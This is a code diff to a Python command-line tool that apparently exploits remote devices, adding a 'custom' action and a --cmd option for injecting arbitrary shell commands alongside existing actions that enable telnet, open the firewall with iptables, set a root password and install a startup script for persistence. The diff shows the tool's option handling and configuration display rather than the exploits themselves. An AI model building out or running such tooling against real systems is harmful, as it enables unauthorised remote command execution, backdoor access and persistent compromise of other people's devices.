@@ -44,7 +44,8 @@ ACTION_DESCRIPTIONS = {
     "iptables":"Add iptables rule to allow telnet through firewall",
     "rootpass":"Set custom root password",
     "persist": "Install startup script for persistence across reboots",
-    "all":     "Run all actions above",
+    "custom":  "Run arbitrary shell command(s) supplied via --cmd (repeatable)",
+    "all":     "Run all of the above (except custom)",
 }
 
 
@@ -94,6 +95,13 @@ def run(
             help="Action(s) to perform: telnet iptables rootpass persist all (repeatable, default: all)",
         ),
     ] = None,
+    cmd: Annotated[
+        Optional[list[str]],
+        typer.Option(
+            "--cmd", "-c",
+            help="Shell command to inject (repeatable). Requires --action custom.",
+        ),
+    ] = None,
     no_verify: Annotated[bool, typer.Option("--no-verify", help="Skip telnet verification")] = False,
     list_exploits: Annotated[bool, typer.Option("--list-exploits", help="Show available exploits and exit")] = False,
     list_actions: Annotated[bool, typer.Option("--list-actions", help="Show available actions and exit")] = False,
@@ -112,10 +120,17 @@ def run(
     active_actions = actions if actions else ["all"]
     exploit_choice = exploit_id or "auto"
 
-    _print_config(target, port, username, root_pass, telnet_port, exploit_choice, active_actions)
+    if cmd and "custom" not in active_actions:
+        rprint("[yellow]⚠ --cmd has no effect without --action custom[/yellow]")
+
+    if "custom" in active_actions and not cmd:
+        rprint("[red]--action custom requires at least one --cmd value.[/red]")
+        raise typer.Exit(1)
+
+    _print_config(target, port, username, root_pass, telnet_port, exploit_choice, active_actions, cmd)
 
     tgt = Target(host=target, port=port, username=username, password=password)
-    commands = build_payload(active_actions, root_pass, telnet_port)
+    commands = build_payload(active_actions, root_pass, telnet_port, custom_cmds=cmd)
 
     if not commands:
         rprint("[red]No commands to execute — check your --action values.[/red]")
@@ -142,6 +157,7 @@ def run(
 def _print_config(
     target: str, port: int, username: str, root_pass: str,
     telnet_port: int, exploit_choice: str, active_actions: list[str],
+    custom_cmds: list[str] | None = None,
 ) -> None:
     table = Table(show_header=False, box=None, padding=(0, 2))
     table.add_column("Key", style="bold cyan")
@@ -152,6 +168,9 @@ def _print_config(
     table.add_row("Telnet port", str(telnet_port))
     table.add_row("Exploit", exploit_choice)
     table.add_row("Actions", ", ".join(active_actions))
+    if custom_cmds:
+        for i, c in enumerate(custom_cmds, 1):
+            table.add_row(f"  cmd[{i}]", c)
     console.print(Panel(table, title="[bold]Configuration[/bold]", expand=False))
 
 
